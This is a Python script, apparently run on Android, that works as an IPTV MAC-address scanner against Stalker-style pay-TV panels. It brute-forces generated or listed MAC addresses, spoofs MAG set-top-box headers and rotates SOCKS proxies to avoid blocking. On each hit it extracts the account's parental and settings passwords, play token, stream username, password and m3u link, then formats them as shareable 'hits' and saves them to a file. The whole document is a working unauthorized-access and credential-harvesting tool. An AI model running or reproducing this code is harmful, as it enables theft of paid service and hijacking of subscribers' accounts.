import os,pip
import datetime,os
import socket,hashlib
import json,random,sys, time,re
import androidhelper as sl4a
import subprocess
import pathlib
subprocess.run(["clear", ""])
try:
	import requests
except:
	print("requests modulu yüklü değil \n requests modulü yükleniyor \n")
	pip.main(['install', 'requests'])
import requests
try:
	import sock
except:
	print("sock modulu yüklü değil \n sock modulü yükleniyor \n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
import sock

subprocess.run(["clear", ""])
ad = sl4a.Android()
oto=0
tur=0
Seri=""
csay=0

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
ses= requests.Session()
logging.captureWarnings(True)

say=0
yanpanel="hata" 
imzayan="" 
bul=0
hit=0
prox=0
cpm=1


macSayisi=999999999999991# 1#deneme sayisı
feyzo=("""
\33[32m▰▰▰▰ᴘʏᴛʜᴏɴ 🅑🅛🅤🅔-🅦🅗🅘🅣🅔 -ᴘʏ ᴄᴏɴғɪɢ▰▰▰▰       \33[33m                 
▁ ▂ ▄ ▅ ▆ ▇ █💥░P░R░A░V░E░E░N░💥█ ▇ ▆ ▅ ▄ ▂ ▁             

\33[32m▰▰▰▰ 🅑🅛🅤🅔-🅦🅗🅘🅣🅔 ᴘʏ ᴄᴏɴғɪɢ ▰▰▰▰             \33[0m""")
print(feyzo) 
pattern= "(00:\w{2}:79:\w{2}:\w{2}:\w{2})"
ozelmac=""
#################
nick='@FeyzullahK'
nick=input("""

	Nick=""")
subprocess.run(["clear", ""])
print(feyzo) 
panel = input("""

\33[32mAvilable panles for scan
        portal.php
        server/load.php
        xUi /c/\n
	\33[1mSmile when scanning.. 😎 \n\n
Type 1 to for panel selection=\33[0m\33[31m\33[1m""")

if panel=="1":
    
    uzmanm=input("""
\33[34mTo Select your desired panel
	1=portal.php
	2=server/load.php
	3=xUi /c/
	4=I'll find out for myself
    	Type Answer=\33[35m""")
    if uzmanm=="4":
    	uzmanm=input("Answer=")
    if  uzmanm=="1":
    	uzmanm="portal.php"
    if uzmanm=="" or uzmanm=="2":
    	uzmanm="server/load.php"
    if uzmanm=="3":
    	uzmanm="c/server/load.php"
    subprocess.run(["clear", ""])
    print(feyzo) 
    panel = input("""
Example Panel:Port = starshare.live:8080\n
	\33[1mSmile while scanning.. ? \n\n
Panel:Port=\33[0m\33[31m\33[1m""")


kanalkata="0"
kanalkata=input("""
Should Channel Categories be included in the signature?
	0= Addition
	1= Only Channel category
	2= Add them all (Live-VOD SERIS)
\33[33mAnswer=""")



subprocess.run(["clear", ""])
print(feyzo) 

combo=input("""
	Select the scan type..!
1 = Combo
2 = Automatic Combo

 Answer=""" )
subprocess.run(["clear", ""])
print(feyzo) 
totLen="000000"
if combo=="1":
 	say=0
 	dsy=""
 	dir='/sdcard/iptv/combo/'
 	for files in os.listdir (dir):
 		say=say+1
 		dsy=dsy+"	"+str(say)+"-) "+files+'\n'
 	print ("""Select the combination listed below!!!
"""+dsy+"""
\33[33mCombo in your folder """ +str(say)+""" file/files was found !
	""")
 	dsyno=str(input(" \33[31mCombo No =\33[0m"))
 	say=0
 	for files in os.listdir (dir):
 			say=say+1
 			if dsyno==str(say):
 				dosyaa=(dir+files)
 	say=0
 	print(dosyaa) 
 	c=open(dosyaa, 'r')
 	
 	totLen=c.readlines()
 	subprocess.run(["clear", ""])
 	print(feyzo) 
 	print("In order to be able to continue scanning when the mac in your combo is not enough")
macturu=input("""
\33[1mSelect the Mac combination type...?\33[0m
\33[33mFor successive increasing mac = \33[31m1
\33[33mFor random randomization   = \33[31m2

\33[0m\33[1mMac Combination Type=\33[31m""")
if macturu=="":
	macturu="2"
#################
#print("\nTaranacak Panel:Port=\33[1m\33[31m" + panel +"\33[0m\n") 
#D4:CF:F9
#MacCombo="33:44:CF:4"
MacCombo="00:1A:79:"
#MacCombo="10:27:be:"

Macs = input("""\33[0m
Type 5 for the running mac test...
Type 0 to change the Mac type...

\33[33mSeris Mac Use?
\33[1m\33[34mEvet (1) \33[0m or \33[1m\33[32mHayır (2) \33[0m Answer!! 

Answer=""") 
if Macs=="5":
	macSayisi=1#int(input("Denecek mac sayısı =")) 
	ozelmac=input("Type private mac =")
dmac=""
if  Macs=="0":
	dmac=input("""
Default MacType
	1= 00:1A:79:
	2= 10:27:BE:
	3= 33:44:CF
	4= Kendim Beliryeceğim...
	""")
	if dmac=="1":
		MacCombo="00:1A:79:"
		Macs = input("\33[0m\nSeri Mac Kullanılsın mı? \nCevap \33[1m\33[34mEvet (1) \33[0m yada \33[1m\33[32mHayır (2) \33[0m Yazınız!! =") 

	if dmac=="2":
		MacCombo="10:27:BE:"
		Macs = input("\33[0m\nSeri Mac Kullanılsın mı? \nCevap \33[1m\33[34mEvet (1) \33[0m yada \33[1m\33[32mHayır (2) \33[0m Yazınız!! =") 

	if dmac=="3":
		MacCombo="33:44:CF:"
		Macs = input("\33[0m\nSeri Mac Kullanılsın mı? \nCevap \33[1m\33[34mEvet (1) \33[0m yada \33[1m\33[32mHayır (2) \33[0m Yazınız!! =") 

	if dmac=="4":
		MacCombo=input("İlk üç maç türünü yazınız...")
		Macs = input("\33[0m\nSeri Mac Kullanılsın mı? \nCevap \33[1m\33[34mEvet (1) \33[0m yada \33[1m\33[32mHayır (2) \33[0m Yazınız!! =") 


if Macs[:1]=="e" or Macs[:1]=="E"  or Macs=="1":
    Seri=input("Example="+MacCombo+"\33[31m5\33[0m\nExample="+MacCombo+"\33[31mFa\33[32m\nWrite one or two values!!!\33[0m\n\33[1m"+MacCombo+"\33[31m")
    Seri=Seri[:2]
    MacCombo=MacCombo+Seri[:2]
#################
#MacCombo=MacCombo
subprocess.run(["clear", ""])
print(feyzo) 
#print(len(feyzo)) 
mm=MacCombo.replace(':',"")
if panel=="" :
    exit() 
if len(mm)==6:
	turet=6
	MacCombo=MacCombo+":"
if len(mm)==7:
	turet=5
if len(mm)==8:
	turet=4
	MacCombo=MacCombo+":"
Rhit='\33[33m' 
Ehit='\033[0m' 
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
tkn1="a"
tkn2="a"
tkn3="a"
tkn4="a"
tkn5="a"
pro1="a"
pro2="a"
pro3="a"
trh1="a"
trh2="a"
trh3="a"
adult=""
play_token=""
acount_id=""
stb_id=""
stb_type=""
sespas=""
stb_c=""
timezon=""
tloca=""
       
subprocess.run(["clear", ""])
print(feyzo) 
acount_id="bbb"
a="0123456789ABCDEF"
s=-1
ss=0
sss=0
ssss=0
sd=0
sdd=0
bad=0
proxies=""
proxi=input("""
	Want to use proxies..!
1 - Yes
2 - No
Write 1 or 2 =""")
subprocess.run(["clear", ""])
print(feyzo) 
if proxi =="1":
	say=0
	dsy=""
	dir='/sdcard/iptv/proxy/'
	for files in os.listdir (dir):
		if files.endswith(".txt"):
			say=say+1
			dsy=dsy+"	"+str(say)+"-) "+files+'\n'
	print ("""
	Select the combination listed below!!!
"""+dsy+"""
\33[33mCombo in your folder """ +str(say)+""" file/files was found !
Please select your Proxy Socks5 file...!
	""")
	dsyno=str(input(" \33[31mCombo No =\33[0m"))
	say=0
	for files in os.listdir (dir):
		if files.endswith(".txt"):
			say=say+1
			if dsyno==str(say):
				dosyaa=(dir+files)
	say=0
	proxies=""
	print(dosyaa) 
	Proxy=dosyaa
	c=open(Proxy,'r')
	sock=c.readlines()
	prox=0
	Proxy=dosyaa
	subprocess.run(["clear", ""])
	print(feyzo) 
	pro=input("""
What is the type of proxy in the file you choose?
	1 - ipVanish Socks5
	2 - free Socks4 
	3 - free Socks5
		Proxy type=""")
subprocess.run(["clear", ""])
print(feyzo) 
DosyaA="/sdcard/iptv/hits/" + panel.replace(":","_") +"@praveen.txt"
def yaz(hits):
    dosya=open(DosyaA,'a+') 
    dosya.write(hits)
    dosya.close()
subprocess.run(["clear", ""])  
print(feyzo) 
for mag in range(0,macSayisi):
	oto=""
	macr=""
	tur=0
	if turet==5:
		nokta=1
	else:
		nokta=2
	for i in range(turet):
		if tur ==nokta:
			oto=oto+":"
			tur=0
			nokta=2
		oto=oto+random.choice('ABCDEF0123456789')
		tur = tur +1
		macr=oto
	s=s+1
	if s ==16:
		ss=ss+1
		s=0
	if ss ==16:
		sss=sss+1
		ss=0
		s=0
	if sss==16:
		ssss=ssss+1
		sss=0
		ss=0
		s=0
	if ssss==16:
		sd=sd+1
		ssss=0
		sss=0
		ss=0
		s=0		
	if sd==16:
		sdd=sdd+1
		sd=0
		sss=0
		ss=0
		s=0

	if sdd==16:
		sdd=0
		sd=0
		sss=0
		ss=0
		s=0
	
	seri1=a[sdd]
	seri2=a[sd]
	if not Seri=="":
		if len(Seri)==1:
			seri1=""#Seri[0]
			
		if len(Seri)==2:
			seri1=""#Seri[0]
			seri2=""#Seri[1]
	maca=(seri1+seri2+":"+a[ssss]+a[sss]+":"+a[ss]+a[s])
	if macturu =="1":
		mac=maca
	else:
		mac=macr
	mac=MacCombo+mac
		
		
	
	mac=mac.replace("::",":")
	mac=mac.replace(" ","")
	macs=mac.replace(':','%3A')
	combo=combo
	if combo=="1":
		#print(combo)
		if len(totLen)-2 > csay:
			#print(combo)
			while True:
			    # print(csay)
			     csay=csay+1
			     if csay > len(totLen)-1 :
			     	#print("######")
			     	break
			     macv =re.search(pattern,totLen[csay],re.IGNORECASE)
			     if macv:
			     	mac=macv.group()
			     	if not dmac=="":
			     		mac=mac.replace('00:1A:79',MacCombo)
			     	break
	if not ozelmac=="":
		mac=ozelmac
	macs=mac.replace(':','%3A')	     

		
	HEADERA={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C; Windows NT 10.0; Win64; x64; rv:74.0) AppleWebKit/533.3 Gecko/20100101 Firefox/74.0 MAG200 stbapp ver: 2 rev: 250 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Asia%2Shanghai" ,
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
	}	
	
	url1="http://"+panel+"/"+uzmanm+"?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml" 
	#print(url1)
	token=""
	veri=""
	
	
	if proxi =="1":
			if prox==len(sock)-2:
				prox=0
			#print("evet")
			if pro=="1":
					#print("1")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							#print(prox)
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							pip=pveri.split(':')[0]
							pport=pveri.split(':')[1]
							pname=pveri.split(':')[2]
							ppass=pveri.split(':')[3]
							proxies={'http':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport,
							'https':'socks5://'+pname+':'+ppass+'@'+pip+':'+pport}
							print('\33[33mSocks5 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad)+"\33[0m" )
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
							veri=str(res.text)
							#print(str(req.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass
			if pro=="2":
					#print("2")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							#print(pveri)
							pip=pveri.split(':')[0]#""
							pport=pveri.split(':')[1]#""
							proxies={'http':'socks4://'+pip+':'+pport,
						'https':'socks4://'+pip+':'+pport}
							print('Socks4 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad))
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
							veri=str(res.text)
							#print(str(re.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass
	
			if pro=="3":
					#print("2")
					while True:
						try:
							if prox==len(sock)-2:
								prox=0
							prox=prox+1
							pveri=(sock[prox])
							pveri=pveri.replace('\n','')
							#print(pveri)
							pip=pveri.split(':')[0]#""
							pport=pveri.split(':')[1]#""
							proxies={'http':'socks5://'+pip+':'+pport,
						'https':'socks5://'+pip+':'+pport}
							print('Socks5 Total:'+str(len(sock)-1)+' Run: ' + str(prox)+' Bad:' +str(bad))
							res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
							veri=str(res.text)
							#print(str(re.text)+"-----" + str(prox))
							break
						except :
							bad=bad+1
							pass
		
	
	

	
#	try:
	else:
		bag1=0
		while True:
			try:
				res = ses.get(url1,proxies =proxies,  headers=HEADERA, timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag1=bag1+1
				time.sleep(2)
				if bag1==4:
					quit()
		bag1=0
					
		veri=str(res.text)
		
	if 1==1:
            renk="\33[0m"
            if 'token' in veri:
            	token=veri.replace('{"js":{"token":"',"")
            	token=token.replace('"}}',"")
            	renk="\33[0m"
            else:
            	renk="\33[41m"
            
            say=say+1
            #print(token)
            total=str(say) 
            cpm=(time.time()-cpm)
            cpm=(round(60/cpm))
            print ("\33[0m\33[96m🅑-🅦 - 🅟🅨  Total ➤"+total+"    \33[31m Hit ➤" + str(hit)+ "   \33[94m Cpm ➤" +str(cpm)+"      \n " +renk+mac+" \33[32m" +panel)
            
            cpm=time.time()
            
            
            HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C; Windows NT 10.0; Win64; x64; rv:74.0) AppleWebKit/533.3 Gecko/20100101 Firefox/74.0 MAG200 stbapp ver: 2 rev: 250 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Asia%2Shanghai" ,
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"Authorization": "Bearer "+token,
            }
            
         
            url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml" 
            while True:
            	try:
            		res = ses.get(url2,proxies =proxies,  headers=HEADERd, timeout=15, verify=False)
            		break
            	except:
            		bag1=bag1+1
            		time.sleep(2)
            		if bag1==4:
            			quit()
            bag1=0
            		
            	
            veri=""
            veri=str(res.text)
            #print(veri)
            ip=""
            if 'play_token' in veri:
            	adult=veri.split('parent_password":"')[1]
            	adult=adult.split('"')[0]
            	play_token=veri.split('play_token":"')[1]
            	play_token=play_token.split('"')[0]
            	acount_id=veri.split('name":"')[1]
            	acount_id=acount_id.split('"')[0]
            	stb_id=veri.split('id":"')[1]
            	stb_id=stb_id.split('"')[0]
            	stb_type=veri.split('"stb_type":"')[1]
            	stb_type=stb_type.split('"')[0]
            	sespas=veri.split('"settings_password":"')[1]
            	sespas=sespas.split('"')[0]
            	stb_c=veri.split('"client_type":"')[1]
            	stb_c=stb_c.split('"')[0]
            	timezon=veri.split('"default_timezone":"')[1]
            	timezon=timezon.split('"')[0]
            	tloca=veri.split('"default_locale":"')[1]
            	tloca=tloca.split('"')[0]
            	if 'ip' in veri:
            		try:
            			ip=veri.split('ip":"')[1]
            			ip=ip.split('"')[0]
            		except:pass
            
            bag1=0
            url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml" 
            while True:
            	try:
            		res = ses.get(url3, proxies =proxies,  headers=HEADERd, timeout=15, verify=False)
            		break
            	except:
            		bag1=bag1+1
            		time.sleep(2)
            		if bag1==4:
            			quit()
            
            bag1=0
            veri=""
            veri=str(res.text)
            if not veri=="":
            	if not 'js' in veri:
            		url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml&mac="+macs
            		while True:
            			try:
            				res = ses.get(url3, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            				break
            			except:
	            			bag1=bag1+1
	            			time.sleep(2)
	            			if bag1==4:
	            			 	quit()
	            	bag1=0
            		veri=str(res.text)
            
            if not veri.count('phone')==0:#feyzo=="{" :
            	hit=hit+1
            	
            	sound="/sdcard/iptv/hit.mp3"
            	file = pathlib.Path(sound) 
            	if file.exists ():
            		ad.mediaPlay(sound)

            	trh=veri.split('phone":"')[1]
            	trh=trh.replace('"}}',"")
            	#print(trh)
            	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
            	SNENC=SN.upper()
            	SNCUT=SNENC[:13]
            	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
            	DEVENC=DEV.upper()
            	SG=SNCUT+'+'+(mac)
            	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
            	SINGENC=SING.upper()
            	url5="http://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml"
            	kategori="hata"
            	if kanalkata=="1" or kanalkata=="2" :
            		while True:
            			try:
            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            				break
            			except:
            				bag1=bag1+1
            				time.sleep(2)
            				if bag1==4:
            					quit()
            		bag1=0
            			
            		veri=str(res.text)
	            	if veri.count('title":"')>1:
	            		for i in veri.split('title":"'):
	            			kanal= (i.split('","')[0])
	            			kategori=kategori+kanal+" 🛰️ "
	            			#⚡️✨💫
	            		if '*' in kategori:
	            			kategori=kategori.split("*")[1]
	            		kategori=kategori.replace("\/","/")
	            		kategori=kategori.replace('hata{"js":[{"id":"','')
            		
            	#print(kategori)
            	url5="http://"+panel+"/"+uzmanm+"?type=vod&action=get_categories&JsHttpRequest=1-xml"
            	kategoriv="hata"
            	if kanalkata=="2" :
            		while True:
            			try:
            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            				break
            			except:
            				bag1=bag1+1
            				time.sleep(2)
            				if bag1==4:
            					quit()
            		bag1=0
            			
            		veri=str(res.text)
	            	if veri.count('title":"')>1:
	            		for i in veri.split('title":"'):
	            			kanal= (i.split('","')[0])
	            			kategoriv=kategoriv+kanal+" 📺 "
	            			#⚡️✨💫
	            		if '*' in kategoriv:
	            			kategoriv=kategoriv.split("*")[1]
	            		kategoriv=kategoriv.replace("\/","/")
	            		kategoriv=kategoriv.replace('hata{"js":[{"id":"','')
            	#print(kategori)
            	url5="http://"+panel+"/"+uzmanm+"?type=series&action=get_categories&JsHttpRequest=1-xml"
            	kategoris="hata"
            	if kanalkata=="2" :
            		while True:
            			try:
            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            				break
            			except:
            				bag1=bag1+1
            				time.sleep(2)
            				if bag1==4:
            					quit()
            		bag1=0
            			
            		veri=str(res.text)
	            	if veri.count('title":"')>1:
	            		for i in veri.split('title":"'):
	            			kanal= (i.split('","')[0])
	            			kategoris=kategoris+kanal+" 🎬 "
	            			#⚡️✨💫
	            		if '*' in kategoris:
	            			kategoris=kategoris.split("*")[1]
	            		kategoris=kategoris.replace('\/','')
	            		kategoris=kategoris.replace('hata{"js":[{"id":"','')
	            		
            		
            	#print(kategori)            	
            	url5="http://"+panel+"/"+uzmanm+" ?action=get_ordered_list&type=series&p=1&JsHttpRequest=1-xml"
            	token2="play_token" 
            	while True:
            		try:
            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            			break
            		except:
            			bag1=bag1+1
            			time.sleep(2)
            			if bag1==4:
            				break
            	bag1=0
            	veri=str(res.text)
            	if 'cmd' in veri:
            		token2=veri.split('cmd":"')[1]
            		token2=token2.split('"')[0]
            	#print(token2)
            	real=panel
            	HEADERd={
"Host":panel,            	
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C; Windows NT 10.0; Win64; x64; rv:74.0) AppleWebKit/533.3 Gecko/20100101 Firefox/74.0 MAG200 stbapp ver: 2 rev: 250 Mobile Safari/533.3" ,
"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Accept-Language": "en-US,*",
"Accept-Charset": "UTF-8,*;q=0.8",
"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=b01850af81da130f1f4407a96da5b48c" ,
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"Authorization": "Bearer "+token,
            }
            	url5="http://"+real+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/1823_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
            	userm="hata"
            	pasdm=""
            	while True:
            		try:
            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            			break
            		except:
            			bag1=bag1+1
            			time.sleep(2)
            			if bag1==4:
            				break
            	bag1=0
            	veri=str(res.text)
            	veri=veri.replace('live\/', '') 
            	real=veri.split('\/')[2]
            	userm=veri.split('\/')[3]
            	pasdm=veri.split(userm+'\/')[1]
            	pasdm=pasdm.split('\/')[0]
            	#print(userm)
            	HEADERd={
"User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C; Windows NT 10.0; Win64; x64; rv:74.0) AppleWebKit/533.3 Gecko/20100101 Firefox/74.0 MAG200 stbapp ver: 2 rev: 250 Mobile Safari/533.3" ,
"Referer": "http://"+panel+"/c/" ,
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"Accept-Encoding": "gzip, deflate" ,
"Connection": "Keep-Alive" ,
"Authorization": "Bearer "+token,
            }
            	if userm=="hata":
            			url5="http://"+real+"/"+uzmanm+" ?action=create_link&type=vod&cmd="+token2+"&JsHttpRequest=1-xml"
            			while True:
            				try:
            					res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            					break
            				except:
            					bag1=bag1+1
            					time.sleep(2)
            					if bag1==4:
            						break
            			bag1=0
            			real=veri.split('\/')[2]
            			userm=veri.split('\/')[4]
            			pasdm=veri.split('\/')[5]
            			
            	realm=real
            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_live_streams"
            	while True:
            		try:
            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            			break
            		except:
            			bag1=bag1+1
            			time.sleep(2)
            			if bag1==4:
            			 	break
            	bag1=0
            	veri=str(res.text)
            	kanalsayisi=str(veri.count("stream_id"))
            	#print(kanalsayisi)
            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_vod_streams"
            	while True:
            		try:
            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            			break
            		except:
            			bag1=bag1+1
            			time.sleep(2)
            			if bag1==4:
            			 	break
            	bag1=0
            	veri=str(res.text)
            	filmsayisi=str(veri.count("stream_id"))
            	
            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_series"
            	while True:
            		try:
            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            			break
            		except:
            			bag1=bag1+1
            			time.sleep(2)
            			if bag1==4:
            			 	break
            	bag1=0
            	veri=str(res.text)
            	dizisayisi=str(veri.count("series_id"))
            	
            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm
            	while True:
            		try:
            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
            			break
            		except:
            			bag1=bag1+1
            			time.sleep(2)
            			if bag1==4:
            			 	break
            	bag1=0
            	veri=str(res.text)
            	acon="" 
            	if 'active_cons' in veri:
            		try:
		            	#print(veri)
		            	acon=""
		            	acon=veri.split('active_cons":')[1]
		            	acon=acon.split(',')[0]
		            	acon=acon.replace('"',"")
		            	
		            	mcon=veri.split('max_connections":')[1]
		            	mcon=mcon.split(',')[0]
		            	mcon=mcon.replace('"',"")
		            	
		            	status=veri.split('status":')[1]
		            	status=status.split(',')[0]
		            	status=status.replace('"',"")
		            	
		            	timezone=veri.split('timezone":"')[1]
		            	timezone=timezone.split('",')[0]
		            	timezone=timezone.replace("\/","/")
		            	
		            	realm=veri.split('url":')[1]
		            	realm=realm.split(',')[0]
		            	realm=realm.replace('"',"")
		            	#print(realm)
		            	portal=panel
		            	port=veri.split('port":')[1]
		            	port=port.split(',')[0]
		            	port=port.replace('"',"")
		            	
		            	user=veri.split('username":')[1]
		            	user=user.split(',')[0]
		            	user=user.replace('"',"")
		            	
		            	passw=veri.split('password":')[1]
		            	passw=passw.split(',')[0]
		            	passw=passw.replace('"',"")
		            	
		            	bitis=veri.split('exp_date":')[1]
		            	bitis=bitis.split(',')[0]
		            	bitis=bitis.replace('"',"")
		            	if bitis=="null":
		            		bitis="Unlimited"
		            	else:
		            		bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S'))
		            	bitis=bitis
            		except:pass
            	try:
            		pal=panel.split(':')[0]
            		yanpanel1="hata" 
	            	yanpanel="hata" 
	            	url= "http://ipv4info.com/?act=check&ip="+pal
	            	res = ses.get(url, timeout=15, verify=False)
	            	veri=str(res.text)
	            	yan=""
	            	yanlar=veri
	            	yanpanel="hata"
	            	if veri.count("Site info ")>0:
	            	    for i in veri.split('Site info ('):
	            	    	yan=yan+(i.split(')')[0])+" 🌎 "
	            	    	yanpanel=(yan.split('(')[1])
	            	else:
			   		       yan1=veri.split('href="/ip-address')[1]
			   		       yan1=yan1.split('">')[0]
			   		       url="http://ipv4info.com/ip-address"+yan1
			   		       res = ses.get(url, timeout=15, verify=False)
			   		       veri=str(res.text)
			   		       if veri.count("Site info ")>0:
			   		             for i in veri.split('Site info ('):
			   		              yan=yan+(i.split(')')[0])+" 🌎 "
			   		              yanpanel=(yan.split('(')[1])
			   		
			   	#else:
	            	if not realm==panel:
	            		pal=realm.split(':')[0]
	            		url= "http://ipv4info.com/?act=check&ip="+pal
	            		res = ses.get(url, timeout=15, verify=False)
	            		veri=str(res.text)
	            		yan=""
	            		yanpanel1="hata"
	            		if veri.count("Site info ")>0:
	            		   for i in veri.split('Site info ('):
	            		   	if yanpanel.count(i.split(')')[0])==0:
	            		   		yan=yan+(i.split(')')[0])+" 🌎 "
	            		   		yanpanel1=(yan.split('(')[1])
	            		else:
	            			yan1=veri.split('href="/ip-address')[1]
	            			yan1=yan1.split('">')[0]
	            			url="http://ipv4info.com/ip-address"+yan1
	            			res = ses.get(url, timeout=15, verify=False)
	            			veri=str(res.text)
	            			if veri.count("Site info ")>0:
			   		         for i in veri.split('Site info ('):
			   		          	  if yanpanel.count(i.split(')')[0])==0:
			   		          	   	yan=yan+(i.split(')')[0])+" 🌎 "
			   		          	   	yanpanel1=(yan.split('(')[1])
			   		
	            	if not yanpanel1=="hata" :
	            		yanpanel=yanpanel+yanpanel1
	            	yanpanel=yanpanel.replace(" 🌎  🌎 "," 🌎 ")
            	except:pass
            		
            	
            	mlink="http://"+ panel + "/get.php?username=" + userm + "&password=" + pasdm + "&type=m3u_plus"
            	imzaa=""
            	imzab=""
            	imzak=""
            	imza1=("""
📱🅟🅨-🅜🅞🅑 🅢🅒🅐🅝🅝🅔🅡📱
🌐Panel➤http://"""+panel+"""/c/
🌍Real ➤http://"""+real+"""
💎Mac➤ """+mac+"""
📆Exp.➤ """+trh+"""
🅸 🅻🅾🆅🅴 🅼🆈 🅸🅽🅳🅸🅰 🇮🇳""")
            	if not adult =="":
            		imzaa=("""
👤Acn.Id ➤"""+acount_id+"""
👤Stb Id ➤"""+stb_id+"""
📺Stb Type➤"""+stb_type+"""
🎦Client Type➤"""+stb_c+"""
🔞A.Pass➤"""+adult+"""
⚙️S.Pass➤"""+sespas+"""
🎲PlayToken➤"""+play_token+"""
🌍Ip➤"""+ip+"""
🕛TimeZone➤"""+timezon.replace('\/','/')+"""
🌏Local➤"""+tloca+"""
ॐ वसुधैव कुटुंबकम ॐ""")
	   #except:pass
            	imza2=""
            	if not acon=="":
            		imza2=("""
🌐 Host ➤ http://"""+portal+"""
🌍 Real ➤ http://"""+realm+"""
📡 Port ➤ """+port+"""
👩‍ User ➤ """+user+"""
🔑 Pass ➤ """+passw+"""
📆 Exp. ➤ """+bitis+""" 
👩 Act Con ➤ """+acon+"""
👪 Max Con ➤ """+mcon+""" 
🌐 Status ➤ """+status+"""
⏰ TimeZone➤ """+timezone+"""
"""+nick+"""
🎬 Channel Count➤"""+kanalsayisi+"""
🎬 Film Count➤"""+filmsayisi+"""
🎬 VOD Count➤"""+dizisayisi+"""
"""+nick+""" """)
            	imzasif=("""
🔑 Serial➤"""+SNENC+""" 
🔑 SerialСut➤"""+SNCUT+"""
🔑 DeviceID➤"""+DEVENC+"""
🔑 Signature➤"""+SINGENC+"""
🅱🅴 🅷🅰🅿🅿🆈 🅰🅻🆆🅰🆈🆂""")
            	imza3=("""
🔗m3u_Url➤"""+mlink+"""
ENJOY HITS""")
            	#print(yanpanel)
            	if not yanpanel=="hata":
            		imzayan=("""
🌐 Panel Sites ➤ """+yanpanel.replace(" 🌎","\n╠●🌎")+"""❣️""")
            	if kanalkata=="1" or kanalkata =="2":
            		imzab=("""
📡 Countries ➤           		
"""+kategori+""" """)
#⚡️✨💫
            	if kanalkata =="2":
            		imzak=("""
📺 Vod ➤
"""+kategoriv+"""
🎬Series ➤
"""+kategoris+""" """)
            	imzas=("""
💜ᑭYTᕼOᑎ ᗷY ᑭᖇᗩᐯEEᑎ💜""")
            	imza=imza1+imzaa+imza2+imzasif+imzayan+imza3+imzab+imzak+imzas
